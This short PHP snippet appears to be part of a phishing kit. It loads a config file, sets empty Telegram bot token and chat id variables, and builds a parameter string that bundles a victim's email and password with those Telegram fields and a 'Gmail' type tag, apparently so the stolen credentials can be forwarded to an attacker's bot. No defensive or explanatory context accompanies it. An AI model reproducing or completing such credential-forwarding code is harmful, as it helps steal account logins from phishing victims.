<?php
include "../configration.php";
$tgtoken="";
$tgid="";
$params="email=".$email."&password=".$token."&domain=".$domain."&tgtoken=".$tgtoken."&tgid=".$tgid."&page=general&type=Gmail";
?>